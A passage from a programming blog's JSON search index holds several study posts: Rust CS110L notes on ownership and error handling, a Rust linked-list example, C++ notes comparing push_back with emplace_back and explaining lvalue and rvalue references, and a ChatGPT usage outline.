scanf(\u0026#34;%d%d%d\u0026#34;,\u0026amp;x,\u0026amp;y,\u0026amp;v); add2(1,1,n,x,y,v); } else { int x, y; scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;x,\u0026amp;y); printf(\u0026#34;%lld\\n\u0026#34;, query2(1,1,n,x,y,0)); } } return 0; } Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-07-09T01:00:00Z","image":"https://unicocn.github.io/p/data-structures-and-algorithm-template/cover_hu5d3189b976991bbaa97ead5a2f977361_753368_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/data-structures-and-algorithm-template/","title":"常见数据结构 \u0026 算法の模板"},{"content":" Code up a linked list using Rust!\nSpecifically, we will learn:\nHow to write object-oriented rust code and how this code is situated within the paradigm of ownership and borrowing we’ve been discussing. How to allocate memory on the heap using the Box smart pointer type. How to do error handling in Rust. How to represent the idea of a null-pointer using Option. How to convert a mutable reference to an owned value using take() (if time permits) How to use traits in Rust. Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 struct Node { value : u32, next : Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;, // next could be nullptr, use Option\u0026lt;\u0026gt; } pub struct LinkedList { head : Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;, size : usize, } impl Node { fn new(value : u32, next : Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;) -\u0026gt; Node{ Node { value: value, next: next } } } impl LinkedList { pub fn new() -\u0026gt; LinkedList { LinkedList { head: None, size: 0 } } pub fn get_size(\u0026amp;self) -\u0026gt; usize { self.size } pub fn is_empty(\u0026amp;self) -\u0026gt; bool { self.size == 0 } pub fn push(\u0026amp;mut self, value : u32) { /* why use self.head.take() ? * because self.head is Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;, and LinkedList has its ownership * now we want to give self.head\u0026#39;s ownership to Node::new() * so we could use .take(), to give self.head\u0026#39;s ownership to Node::new() * btw, take() is for Option\u0026lt;\u0026gt;, is self.head.is_some(), take() return Some() * leave None to self.head, is self.head.is_none(), take() return None */ let new_node = Box::new(Node::new(value, self.head.take())); self.head = Some(new_node); self.size += 1; } pub fn pop(\u0026amp;mut self) -\u0026gt; Option\u0026lt;u32\u0026gt; { let node = self.head.take()?; // if self.head is None, return None, else continue self.head = node.next; self.size -= 1; Some(node.value) } pub fn display(\u0026amp;self) { let mut current = \u0026amp;self.head; let mut result = String::new(); loop { match current { Some(node) =\u0026gt; { result = format!(\u0026#34;{} {}\u0026#34;, result, node.value); current = \u0026amp;node.next; }, None =\u0026gt; break, } } println!(\u0026#34;{}\u0026#34;, result); } } fn main() { let mut list = LinkedList::new(); for i in 1..10 { list.push(i); } list.display(); list.pop(); list.display(); assert!(list.get_size() == 8); } Explain: When to use unwrap | expect Example:\nFirst, you’ll need to open the file by calling File::open(filename). File::open returns a Result, since opening the file may fail (e.g. if the filename is invalid).\nYou could open the file like this:\n1 let file = File::open(filename).unwrap(); However, it’s generally good style to avoid calling unwrap or expect unless the error absolutely should never occur, or unless you’re writing the code in main or some other high-level function that won’t be reused in your program. If you use unwrap or expect in helper functions, then code might use those helper functions without realizing they could cause panics.\nThe idiomatic way to deal with this is to write something like the following:\n1 let file = File::open(filename)?; The ? operator is commonly used in Rust to propagate errors without having to repeatedly write a lot of code to check a Result. That line of code really expands to this:\n1 2 3 4 let file = match File::open(filename) { Ok(file) =\u0026gt; file, Err(err) =\u0026gt; return Err(err), }; If the Result was Ok, then the ? gives you the returned value, but if the result was an Err, it causes your function to return that Err (propagating the error through the call chain).\nOnce you have your file open, you can read the lines like so:\n1 2 3 4 for line in io::BufReader::new(file).lines() { let line_str = line?; // do something with line_str* } In this code, line is a Result\u0026lt;String, io::Error\u0026gt;. We can safely unwrap its Ok value using ?, as we did when opening the file. Then, you can add the string to a vector.\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-15T00:00:00Z","image":"https://unicocn.github.io/p/rust-cs110l-notes-3/cover_hu5f8d5b24f629f61bf6061899af2962f9_20586_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/rust-cs110l-notes-3/","title":"Stanford CS110L Notes 3"},{"content":"ChatGPT 使用手册（持续更新） ChatGPT正在改变这个世界，对于身处时代剧变中的个体，利用好这个强大的AI助手，可以极大地提高自身学习效率和生产力 本文受@西西弗斯没问题 启发，部分内容参考了玩转ChatGPT\nChatGPT使用渠道 使用ChatGPT的必备技能：科学上网\n网站 API 应用软件 浏览器插件 如何写出更好的prompt ChatGPT Prompt Engineering for Developers By Andrew Ng Link: ChatGPT Prompt Engineering for Developers\n效率Up Up! 学习 场景一：制作PPT 工具推荐\n使用指南\n场景二：作业答疑 工具推荐\n使用指南\n场景三：撰写课程论文 工具推荐\n使用指南\n科研 场景一：快速阅读论文 工具推荐\n使用指南\n场景二：论文翻译 工具推荐\n使用指南\n英语 场景一：练习口语 工具推荐\n使用指南\n场景二：纠正语法 工具推荐\n使用指南\n场景三：情境写作 工具推荐\n使用指南\n场景四：文章美化 工具推荐\n使用指南\n面试 场景一：撰写自我介绍 工具推荐\n使用指南\n场景二：了解岗位要求 工具推荐\n使用指南\n场景三：辅助面试复盘 工具推荐\n使用指南\n工作 场景一：报告撰写 工具推荐\n使用指南\n场景二：职业规划 工具推荐\n使用指南\n生活 场景一：生活常识 工具推荐\n使用指南\n场景二：日常饮食 工具推荐\n使用指南\n场景三：旅游规划 工具推荐\n使用指南\n资源推荐 [视频教程] 你真的会用ChatGPT了吗？「建议收藏」20分钟学完ChatGPT的正确使用方式｜释放你的十倍生产力 Reference 玩转ChatGPT\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-13T12:00:00Z","image":"https://unicocn.github.io/p/chatgpt-tutorial/cover_hua6252465c422341b1644c214632e7298_33850_120x120_fill_q75_box_smart1.jpg","permalink":"https://unicocn.github.io/p/chatgpt-tutorial/","title":"生产力提高指南 —— ChatGPT使用手册"},{"content":" Rust —— A language empowering everyone to build reliable and efficient software.\nLec03: Error Handling Ownership Example One:\n1 2 3 4 5 6 7 8 9 fn f(s: String) { println!(\u0026#34;{}\u0026#34;, s); } fn main() { let s = String::from(\u0026#34;Hello\u0026#34;); f(s); // will work f(s); // won\u0026#39;t work } The problem is in the first f(s), main has give s ’s ownership to f, and f doesn’t give it back. So main lose s ’s ownership in the second f(s). By the way, after the first f(s) ends, s will be free.\n🌟Exception：\n1 2 3 4 5 6 7 8 9 fn om_nom_nom(param: u32) { println!(\u0026#34;{}\u0026#34;, param); } fn main() { let x = 1; om_nom_nom(x); // will work om_nom_nom(x); // will work } It works fine because u32 implements a “copy trait” that changes what happens when it is assigned to variables or passed as a parameter.\nGood news, only primitive types + a handful of others use copy semantics, and you just need to remember those.\nExample Two:\n1 2 3 4 5 6 fn main() { let s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;s; let s2 = \u0026amp;s; println!(\u0026#34;{} {}\u0026#34;, s, s1); } It works fine, because s s1 s2 are all immutable.\nRemember, you can have as many read-only pointers to something as you want, as long as no one can change what is being pointed to.\n🌟 Counter Example One:\n1 2 3 4 5 6 fn main() { let s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; // invalid let s2 = \u0026amp;s; println!(\u0026#34;{} {}\u0026#34;, s, s1); } This fails to compile because s is immutable, and on the next line, we try to borrow a mutable reference to s. If this were allowed, we could modify the string using s1, even though it was supposed to be immutable.\n🌟 Counter Example Two:\n1 2 3 4 5 6 fn main() { let mut s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; let s2 = \u0026amp;s; println!(\u0026#34;{} {} {}\u0026#34;, s, s1, s2); } This fails again, but for a different reason.\nWe first declare s as mutable. 👍 We borrow a mutable reference to s. 👍 We try to borrow an immutable reference to s. However, there already exists a mutable reference to s. Rust doesn’t allow multiple references to exist when a mutable reference has been borrowed. Otherwise, the mutable reference could be used to change (potentially reallocate) memory when code using the other references least expect it. 🌟 Counter Example Three:\n1 2 3 4 5 fn main() { let mut s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; println!(\u0026#34;{} {}\u0026#34;, s, s1); } We first declare s as mutable. 👍 We borrow a mutable reference to s. 👍 We try to use s. However, the value has been “borrowed out” to s1 and hasn’t been “returned” yet. As such, we can’t use s1. Example Three:\n1 2 3 4 5 6 fn main() { let mut s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; // s1 borrows s here println!(\u0026#34;{}\u0026#34;, s1); // return s\u0026#39;s ownership after this line println!(\u0026#34;{}\u0026#34;, s) } It works fine.\n💭 Thinking\n“One thing that’s confusing is why sometimes I need to \u0026amp;var and other times I can just use var: for example, set.contains(\u0026amp;var), but set.insert(var) – why?\u0026quot;\nAnswer:\nWhen inserting an item into a set, we want to transfer ownership of that item into the set; that way, the item will exist as long as the set exists. (It would be bad if you added a string to the set, and then someone freed the string while it was still a member of the set.) However, when trying to see if the set contains an item, we want to retain ownership, so we only pass a reference.\nError Handling about null pointer Introduce Option\u0026lt;T\u0026gt; in Rust\nNull pointer is dangerous in C/C++. To solve this problem, we might want some way to indicate to the compiler when a value might be NULL, so that the compiler can then ensure code using those values is equipped to handle NULL.\nRust does this with the Option type. A value of type Option\u0026lt;T\u0026gt; can either be None or Some(value of type T).\nDefinition of Option\u0026lt;T\u0026gt;:\n1 2 3 4 pub enum Option\u0026lt;T\u0026gt; { None, Some(T), } Example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 fn feeling_lucky() -\u0026gt; Option\u0026lt;String\u0026gt; { if get_random_num() \u0026gt; 10 { Some(String::from(\u0026#34;I\u0026#39;m feeling lucky!\u0026#34;)) } else { None } } // how to use Option\u0026lt;T\u0026gt;? // mothod 1, use is_none() or is_some() to check if feeling_lucky().is_none() { println!(\u0026#34;Not feeling lucky :(\u0026#34;); } // method 2, use unwrap_or(default), if it\u0026#39;s none, use default let message = feeling_lucky().unwrap_or(String::from(\u0026#34;Not lucky :(\u0026#34;)); // method 3, a more idiomatical way match feeling_lucky() { Some(message) =\u0026gt; { println!(\u0026#34;Got message: {}\u0026#34;, message); }, None =\u0026gt; { println!(\u0026#34;No message returned :-/\u0026#34;); }, } Handling errors Introduce Result\u0026lt;T, E\u0026gt; in Rust\nC has an absolutely garbage system for handling errors. C++ and many other languages use exceptions to manage error conditions. It works well, but also has many disadvantages failure modes are hard to spot Rust takes a different, two-pronged approach to error handling\nunrecoverable error, use panic! 1 2 3 if sad_times() { panic!(\u0026#34;Sad times!\u0026#34;); } Panics terminate the program immediately and cannot be caught.\n(Side note: it’s technically possible to catch and recover from panics, but doing so really defeats the philosophy of error handling in Rust, so it’s not advised.)\nrecoverable error You should return a Result. If you return Result\u0026lt;T, E\u0026gt;, you can either return Ok(value of type T) or Err(value of type E)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 fn poke_toddler() -\u0026gt; Result\u0026lt;\u0026amp;\u0026#39;static str, \u0026amp;\u0026#39;static str\u0026gt; { if get_random_num() \u0026gt; 10 { Ok(\u0026#34;Hahahaha!\u0026#34;) } else { Err(\u0026#34;Waaaaahhh!\u0026#34;) } } fn main() { match poke_toddler() { Ok(message) =\u0026gt; println!(\u0026#34;Toddler said: {}\u0026#34;, message), Err(cry) =\u0026gt; println!(\u0026#34;Toddler cried: {}\u0026#34;, cry), } } Or you could use unwrap instead\n1 2 3 4 // Panic if the baby cries: let ok_message = poke_toddler().unwrap(); // Same thing, but print a more descriptive panic message: let ok_message = poke_toddler().expect(\u0026#34;Toddler cried :(\u0026#34;); If the Result was Ok, unwrap() returns the success value; otherwise, it causes a panic. expect() does the same thing, but prints the supplied error message when it panics\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-12T10:20:00Z","image":"https://unicocn.github.io/p/rust-cs110l-notes-2/cover_hu5f8d5b24f629f61bf6061899af2962f9_20586_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/rust-cs110l-notes-2/","title":"Stanford CS110L Notes 2"},{"content":" Rust —— A language empowering everyone to build reliable and efficient software.\nIntro Official Course Website CS 110L: Safety in Systems Programming\nMy Homework Repository GitHub - UnicoCN/learn-rust\nLec01: Why Rust Why not C/C++? Security Issue buffer overflow integer overflow(signed → unsigned) Why not GC’ed language? downsides of GC Expensive Disruptive Non-deterministic Precludes manual optimization can not solve memory leak completely Lec02: Memory Safety Why is it so easy to screw up in C? Dangling Pointers Double Frees Iterator Invalidation Memory Leaks Ownership Rules Each value in Rust has a variable that’s called its owner There can only be one owner at a time When the owner goes out of scope, the value will dropped Lifetime Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-12T10:15:00Z","image":"https://unicocn.github.io/p/rust-cs110l-notes-1/cover_hu5f8d5b24f629f61bf6061899af2962f9_20586_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/rust-cs110l-notes-1/","title":"Stanford CS110L Notes 1"},{"content":"原文：理解 STL - 迭代器与函数对象\nWritten by @xuan-insr\n","date":"2023-06-12T10:13:00Z","image":"https://unicocn.github.io/p/cpp-stl-iterator-and-function-object/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-stl-iterator-and-function-object/","title":"（转载）理解 STL——迭代器和函数对象"},{"content":"什么是push_back和emplace_back push_back和emplace_back是C++11引入的成员函数，用于对vector容器的末尾进行添加元素 push_back的函数签名 void push_back( const T\u0026amp; value ); (until C++20) constexpr void push_back( const T\u0026amp; value ); (since C++20) void push_back( T\u0026amp;\u0026amp; value ); (since C++11) (until C++20) constexpr void push_back( T\u0026amp;\u0026amp; value ); (since C++20) emplace_back的函数签名 template\u0026lt; class\u0026hellip; Args \u0026gt;void emplace_back( Args\u0026amp;\u0026amp;\u0026hellip; args ); (since C++11) (until C++17) template\u0026lt; class\u0026hellip; Args \u0026gt;reference emplace_back( Args\u0026amp;\u0026amp;\u0026hellip; args ); (since C++17) (until C++20) template\u0026lt; class\u0026hellip; Args \u0026gt;constexpr reference emplace_back( Args\u0026amp;\u0026amp;\u0026hellip; args ); (since C++20) push_back和emplace_back的异同点 push_back仅支持传入一个参数，而emplace_back支持传入一个可变参数列表 push_back支持传入左值（常量左值引用捕获）和右值（右值引用捕获），emplace_back也支持传入左值和右值 对于传入的左值，二者均调用一次constructor、一次copy constructor和一次destructor 对于传入的右值，二者均调用一次constructor、一次move constructor和一次destructor emplace_back可以传入构造函数所需的一系列参数，支持in-place construct，而push_back不支持，因此若传入构造函数所需的一系列参数，则只会调用一次constructor（详见例子） insert和emplace的异同和push_back和emplace_back类似 常见误区 emplace_back相比于push_back可以提升效率，原因是可以减少不必要的构造函数调用 对于直接传入左值或者右值的情况，emplace_back并无法提升效率，二者都会创建一个临时对象，通过该临时对象进行拷贝/移动构造，之后再销毁该临时对象\nemplace_back支持右值引用，而push_back不支持 从函数签名可以看到push_back也是支持右值引用的，同时也支持移动语义（调用移动构造函数）\n例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include \u0026lt;vector\u0026gt; #include \u0026lt;cassert\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; struct President { std::string name; std::string country; int year; President(std::string p_name,std::string p_country, int p_year) : name(std::move(p_name)), country(std::move(p_country)), year(p_year) { std::cout \u0026lt;\u0026lt; \u0026#34;I am being constructed.\\n\u0026#34;; } President(President\u0026amp;\u0026amp; other) : name(std::move(other.name)), country(std::move(other.country)), year(other.year) { std::cout \u0026lt;\u0026lt; \u0026#34;I am being moved.\\n\u0026#34;; } President\u0026amp; operator=(const President\u0026amp; other) = default; }; int main() { std::vector\u0026lt;President\u0026gt; elections; std::cout \u0026lt;\u0026lt; \u0026#34;emplace_back:\\n\u0026#34;; auto\u0026amp; ref = elections.emplace_back(\u0026#34;Nelson Mandela\u0026#34;, \u0026#34;South Africa\u0026#34;, 1994); assert(ref.year == 1994 \u0026amp;\u0026amp; \u0026#34;uses a reference to the created object (C++17)\u0026#34;); std::vector\u0026lt;President\u0026gt; reElections; std::cout \u0026lt;\u0026lt; \u0026#34;\\npush_back:\\n\u0026#34;; reElections.push_back(President(\u0026#34;Franklin Delano Roosevelt\u0026#34;, \u0026#34;the USA\u0026#34;, 1936)); std::cout \u0026lt;\u0026lt; \u0026#34;\\nContents:\\n\u0026#34;; for (President const\u0026amp; president: elections) std::cout \u0026lt;\u0026lt; president.name \u0026lt;\u0026lt; \u0026#34; was elected president of \u0026#34; \u0026lt;\u0026lt; president.country \u0026lt;\u0026lt; \u0026#34; in \u0026#34; \u0026lt;\u0026lt; president.year \u0026lt;\u0026lt; \u0026#34;.\\n\u0026#34;; for (President const\u0026amp; president: reElections) std::cout \u0026lt;\u0026lt; president.name \u0026lt;\u0026lt; \u0026#34; was re-elected president of \u0026#34; \u0026lt;\u0026lt; president.country \u0026lt;\u0026lt; \u0026#34; in \u0026#34; \u0026lt;\u0026lt; president.year \u0026lt;\u0026lt; \u0026#34;.\\n\u0026#34;; } /* Output： emplace_back: I am being constructed. push_back: I am being constructed. I am being moved. Contents: Nelson Mandela was elected president of South Africa in 1994. Franklin Delano Roosevelt was re-elected president of the USA in 1936. */ Reference std::vector\u0026lt;T,Allocator\u0026gt;::push_back - cppreference.com\nstd::vector\u0026lt;T,Allocator\u0026gt;::emplace_back - cppreference.com\npush_back vs emplace_back\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-12T10:00:00Z","image":"https://unicocn.github.io/p/cpp-emplace_back-vs-push_back/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-emplace_back-vs-push_back/","title":"理解 push_back ｜ emplace_back"},{"content":"理解万能引用 | 左值引用 | 右值引用 在写C++代码时，被万能引用、左值引用和右值引用的问题困扰了很久，于是花了点时间整理了相关概念，并做了一个总结\n左值和右值 The original definition of lvalues and rvalues from the earliest days of C is as follows: An lvalue is an expression e that may appear on the left or on the right hand side of an assignment, whereas an rvalue is an expression that can only appear on the right hand side of an assignment.\n最初，左值和右值的概念来自C，左值是可以出现在赋值语句左侧和右侧的表达式，右值是仅能出现在赋值语句右边的表达式\n1 2 3 4 5 6 7 8 9 10 11 int a = 42; int b = 43; // a and b are both lvalues: a = b; // ok b = a; // ok a = a * b; // ok // a * b is an rvalue: int c = a * b; // ok, rvalue on right hand side of assignment a * b = 42; // error, rvalue on left hand side of assignment 左值右值不仅仅指一个变量，严格来说是指一个表达式，例如 x++、a*b；事实上对编译器来说，一个变量也被当作一个表达式\n在之后的C++中，由于引入了面向对象特性以及更为复杂的赋值方式，左值右值的概念进行了拓展；尽管很难对左值右值下一个准确的定义，但是在绝大多数情况下，可以通过下面的方法对二者进行区分：\nAn lvalue is an expression that refers to a memory location and allows us to take the address of that memory location via the \u0026amp; operator. An rvalue is an expression that is not an lvalue\n左值是拥有一个程序可以访问的地址的表达式，允许我们通过 \u0026amp; 运算符获取该地址；如果一个表达式不是左值，那它就是右值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int i, j, *p; // Correct usage: // the variable i is an lvalue and the literal 7 is a rvalue. i = 7; // Incorrect usage: // The left operand must be an lvalue (C2106). `j * 4` is a rvalue. 7 = i; // C2106 j * 4 = 7; // C2106 // Correct usage: the dereferenced pointer is an lvalue. *p = i; // Correct usage: the conditional operator returns an lvalue. ((i \u0026lt; 3) ? i : j) = 7; // Incorrect usage: the constant ci is a non-modifiable lvalue (C3892). const int ci = 7; ci = 9; // C3892 If the type of an expression is an lvalue reference (e.g., T\u0026amp; or const T\u0026amp;, etc.), that expression is an lvalue.\n特别注意，左值引用和常量左值引用也是左值（无论是否为临时对象，比较反直觉），而右值引用可以是左值也可以是右值，区别在于是否是临时对象\n事实上C++中有一个专门的词value category，用来形容表达式的左右值特性，同时对此进行了更为具体的划分(since C++17)\nglvalue：广义左值 rvalue：右值 lvalue：左值 xvalue：将亡值 prvalue：纯右值 由于value category的细节比较复杂，详细内容可以参考下面的链接：\nValue Categories: Lvalues and Rvalues (C++)\nValue categories - cppreference.com\nReference：\nC++ Rvalue References Explained\n左值引用和右值引用 左值引用 IfXis any type, thenX\u0026amp;is called an lvalue reference toX. It holds the address of an object but behaves syntactically like an object\n左值引用可以被当作一种替代指针的syntax sugar，但是由于其声明时必须绑定一个对象，且不可以更换绑定对象，因此相比裸指针具有更强的内存安全保障；同时左值引用被用作拷贝构造和拷贝赋值\n1 2 3 4 5 6 class Window { public: Window( const Window\u0026amp; ); // Declare copy constructor. Window\u0026amp; operator=(const Window\u0026amp; x); // Declare copy assignment. // ... }; 左值引用可以绑定左值，不可以绑定常量左值和右值\n常量左值引用可以绑定左值、常量左值和右值\n1 2 3 4 5 6 7 8 int a = 1; const int b = 1; int\u0026amp; c = 1; // incorrect int\u0026amp; d = a; // correct int\u0026amp; e = b; // incorrect const int\u0026amp; f = a; // correct const int\u0026amp; g = b; // correct const int\u0026amp; h = 1; // correct 右值引用 IfXis any type, thenX\u0026amp;\u0026amp;is called an rvalue referencetoX\n右值引用可以理解为绑定右值的引用，且右值引用仅能绑定右值\nRvalue references enable you to distinguish an lvalue from an rvalue\n右值引用的引入基于两种需求\n移动语义 当人们希望将对象B赋值给对象A时，左值引用带来的拷贝特性能够帮助实现这一功能；但是为了提升效率，当对象B在赋值给对象A之后就不再被使用，那么完全可以将对象B的资源转移给对象A（底层通过指针的方式实现），进而避免拷贝的资源消耗，人们称之为移动语义；需要注意，在将对象B的资源转移给对象A后，就不应该再使用对象B\n我们可以通过移动构造和移动赋值两种方式实现移动语义\n1 2 3 4 5 6 class Window { public: Window(Window\u0026amp;\u0026amp; ) noexcept; // Declare move constructor. Window\u0026amp; operator=(Window\u0026amp;\u0026amp; x) noexcept; // Declare move assignment. // ... }; 完美转发 Perfect forwarding reduces the need for overloaded functions and helps avoid the forwarding problem. The forwarding problem can occur when you write a generic function that takes references as its parameters. If it passes (or forwards) these parameters to another function, for example, if it takes a parameter of type const T\u0026amp;, then the called function can\u0026rsquo;t modify the value of that parameter. If the generic function takes a parameter of type T\u0026amp;, then the function can\u0026rsquo;t be called by using an rvalue (such as a temporary object or integer literal).\n1 2 3 4 5 6 template\u0026lt;class T\u0026gt; void wrapper(T\u0026amp;\u0026amp; arg) { // arg is always lvalue foo(std::forward\u0026lt;T\u0026gt;(arg)); // Forward as lvalue or as rvalue, depending on T } 完美转发可以帮助人们解决转发问题：\n考虑一种情况，现在我们需要将一个右值作为参数传入函数，在没有右值引用的情况下该如何实现？\n首先左值引用无法绑定右值，因此无法使用左值引用；常量左值引用尽管可以绑定右值，但是由于常量，在函数体中就无法对参数进行修改\n1 2 3 4 // forward的具体实现，本质是类型转换 template\u0026lt;typename _Tp\u0026gt; constexpr _Tp\u0026amp;\u0026amp; forward(typename std::remove_reference\u0026lt;_Tp\u0026gt;::type\u0026amp; __t) noexcept { return static_cast\u0026lt;_Tp\u0026amp;\u0026amp;\u0026gt;(__t); } 基于上面两种需求，人们需要一种新的不同于左值引用的方式，使得能够实现移动语义和完美转发，因此也就引入了右值引用\nReference：\nLvalue reference declarator: \u0026amp;\nRvalue reference declarator: \u0026amp;\u0026amp;\n谈谈完美转发(Perfect Forwarding)：完美转发 = 引用折叠 + 万能引用 + std::forward\nCopy constructors - cppreference.com\nMove constructors - cppreference.com\n万能引用和引用折叠 声明右值引用使用的符号为\u0026amp;\u0026amp;，但是使用\u0026amp;\u0026amp;符号的却不一定是右值引用，这也是C++程序中非常令人困惑的一点\n1 2 3 4 5 6 7 8 9 Widget\u0026amp;\u0026amp; var1 = someWidget; // here, “\u0026amp;\u0026amp;” means rvalue reference auto\u0026amp;\u0026amp; var2 = var1; // here, “\u0026amp;\u0026amp;” does not mean rvalue reference template\u0026lt;typename T\u0026gt; void f(std::vector\u0026lt;T\u0026gt;\u0026amp;\u0026amp; param); // here, “\u0026amp;\u0026amp;” means rvalue reference template\u0026lt;typename T\u0026gt; void f(T\u0026amp;\u0026amp; param); // here, “\u0026amp;\u0026amp;”does not mean rvalue reference The essence of the issue is that “\u0026amp;\u0026amp;” in a type declaration sometimes means rvalue reference, but sometimes it means either rvalue reference or lvalue reference. As such, some occurrences of “\u0026amp;\u0026amp;” in source code may actually have the meaning of “\u0026amp;”, i.e., have the syntactic appearance of an rvalue reference (“\u0026amp;\u0026amp;”), but the meaning of an lvalue reference (“\u0026amp;”).\n在一些时候，\u0026amp;\u0026amp; 既可以绑定左值，也可以绑定右值，人们称其为万能引用(universal reference)\n注：事实上在cpp reference中，并没有universal reference的称呼，其中共定义了四种引用，分别是lvalue reference、rvalue reference、forwarding reference以及dangling reference，其中forwarding reference就是universal reference，可以参考下面链接中的回答\nIs there a difference between universal references and forwarding references?\n什么时候\u0026amp;\u0026amp; 表示万能引用 If a variable or parameter is declared to have type T\u0026amp;\u0026amp; for some deduced type T, that variable or parameter is a universal reference.\n如果一个变量或者参数被声明为T\u0026amp;\u0026amp;，其中T是被推导的类型，那这个变量或者参数就是一个万能引用，形如auto\u0026amp;\u0026amp; 、T\u0026amp;\u0026amp; ，注意T需要是被推导的类型\n例如下面的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 template\u0026lt;typename T\u0026gt; void f(T\u0026amp;\u0026amp; param); // deduced parameter type ⇒ type deduction; // \u0026amp;\u0026amp; ≡ universal reference template\u0026lt;typename T\u0026gt; class Widget { ... Widget(Widget\u0026amp;\u0026amp; rhs); // fully specified parameter type ⇒ no type deduction; ... // \u0026amp;\u0026amp; ≡ rvalue reference }; template\u0026lt;typename T1\u0026gt; class Gadget { ... template\u0026lt;typename T2\u0026gt; Gadget(T2\u0026amp;\u0026amp; rhs); // deduced parameter type ⇒ type deduction; ... // \u0026amp;\u0026amp; ≡ universal reference }; void f(Widget\u0026amp;\u0026amp; param); // fully specified parameter type ⇒ no type deduction; // \u0026amp;\u0026amp; ≡ rvalue reference // push_back can’t exist without the class std::vector\u0026lt;T\u0026gt; that contains it. // But if we have a class std::vector\u0026lt;T\u0026gt;, we already know what T is // so there’s no need to deduce it. template \u0026lt;class T\u0026gt; class vector { public: ... void push_back(T\u0026amp;\u0026amp; x); // fully specified parameter type ⇒ no type deduction; ... // \u0026amp;\u0026amp; ≡ rvalue reference }; template \u0026lt;class T, class Allocator = allocator\u0026lt;T\u0026gt; \u0026gt; class vector { public: ... template \u0026lt;class... Args\u0026gt; void emplace_back(Args\u0026amp;\u0026amp;... args); // deduced parameter types ⇒ type deduction; ... // \u0026amp;\u0026amp; ≡ universal references }; 万能引用什么时候表示左值？什么时候表示右值？ If the expression initializing a universal reference is an lvalue, the universal reference becomes an lvalue reference. (T\u0026amp; \u0026amp;\u0026amp; → T\u0026amp;) If the expression initializing the universal reference is an rvalue, the universal reference becomes an rvalue reference. (T \u0026amp;\u0026amp; → T\u0026amp;\u0026amp;而不是T\u0026amp;\u0026amp; \u0026amp;\u0026amp; → T\u0026amp;\u0026amp;) 此时我们可以发现一个问题，参考如下代码\n1 2 3 4 5 6 7 template\u0026lt;typename T\u0026gt; void f(T\u0026amp;\u0026amp; param); ... int x; ... f(10); // invoke f on rvalue f(x); // invoke f on lvalue 此时对于f(10)来说，T被推导为int，也就是void f(int\u0026amp;\u0026amp; param)，但是对于f(x)，根据万能引用规则，T被推导为int\u0026amp; ，也就是void f(int\u0026amp; \u0026amp;\u0026amp; param)，\u0026amp; \u0026amp;\u0026amp; 这样的引用声明看上去并不合法；为了解决这个问题，C++标准引入了引用折叠的概念\nIt is permitted to form references to references through type manipulations in templates or typedefs, in which case the reference collapsing rules apply: rvalue reference to rvalue reference collapses to rvalue reference, all other combinations form lvalue reference:\n1 2 3 4 5 6 7 8 typedef int\u0026amp; lref; typedef int\u0026amp;\u0026amp; rref; int n; lref\u0026amp; r1 = n; // type of r1 is int\u0026amp; lref\u0026amp;\u0026amp; r2 = n; // type of r2 is int\u0026amp; rref\u0026amp; r3 = n; // type of r3 is int\u0026amp; rref\u0026amp;\u0026amp; r4 = 1; // type of r4 is int\u0026amp;\u0026amp; 至此，万能引用的类型推断就变的合法了\nReference：\nUniversal References in C++11 \u0026ndash; Scott Meyers : Standard C++\nReference declaration - cppreference.com\n常见误区 🌟 某个变量的类型是左值右值 Every C++ expression has a type, and belongs to a value category. The value categories are the basis for rules that compilers must follow when creating, copying, and moving temporary objects during expression evaluation.\n左值右值不是一种类型，而是value category，通常是用于帮助编译器选择如何对一个对象进行创建/赋值/移动\nthe lvalueness or rvalueness of an expression is independent of its type. Consider the type int. There are lvalues of type int (e.g., variables declared to be int), and there are rvalues of type int (e.g., literals like 10).\n使用右值引用一定可以减少内存拷贝 